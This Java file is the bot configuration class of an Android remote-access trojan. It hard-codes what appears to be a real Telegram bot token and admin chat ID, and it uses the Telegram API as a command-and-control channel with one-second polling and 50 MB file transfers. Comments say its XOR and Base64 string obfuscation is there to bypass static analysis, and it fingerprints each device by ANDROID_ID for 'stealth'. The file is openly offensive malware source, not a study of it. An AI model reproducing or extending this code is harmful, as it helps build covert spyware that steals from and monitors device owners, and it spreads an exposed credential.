package com.enterprise.rat.bot;

import android.provider.Settings;
import android.util.Base64;
import com.enterprise.rat.MainApplication;

public class BotConfig {
    // XOR Obfuscated configurations to bypass static analysis
    // Replace with your own XORed base64 strings
    private static final String ENCRYPTED_TOKEN = "YOUR_ENCRYPTED_BOT_TOKEN";
    private static final String ENCRYPTED_CHAT_ID = "YOUR_ENCRYPTED_CHAT_ID";
    
    // Fallback for direct usage if XOR is not applied yet
    public static final String BOT_TOKEN = "8739367697:AAELUfIpX0mU3rcokQQiAywGYMhvpj2ickg"; 
    public static final long ADMIN_CHAT_ID = 8601209747L;

    public static final String BOT_USERNAME = "sukapantatsemog_bot";
    public static final String SESSION_ID = getDeviceSessionId();
    public static final String API_BASE_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    public static final int POLLING_INTERVAL_MS = 1000;
    public static final int MAX_FILE_SIZE = 50 * 1024 * 1024;

    // Decryption method for runtime deobfuscation
    public static String decryptString(String input) {
        byte[] decoded = Base64.decode(input, Base64.DEFAULT);
        byte[] key = "REX_ENT".getBytes();
        byte[] result = new byte[decoded.length];
        for (int i = 0; i < decoded.length; i++) {
            result[i] = (byte) (decoded[i] ^ key[i % key.length]);
        }
        return new String(result);
    }

    public static String getDeviceSessionId() {
        try {
            // Prioritizing ANDROID_ID over IMEI for Android 10+ stealth compatibility
            String androidId = Settings.Secure.getString(
                MainApplication.getAppContext().getContentResolver(),
                Settings.Secure.ANDROID_ID
            );
            if (androidId == null || androidId.isEmpty()) {
                return "SESSION_" + System.currentTimeMillis();
            }
            return "SESSION_" + androidId.toUpperCase();
        } catch (Exception e) {
            return "SESSION_" + System.currentTimeMillis();
        }
    }
}
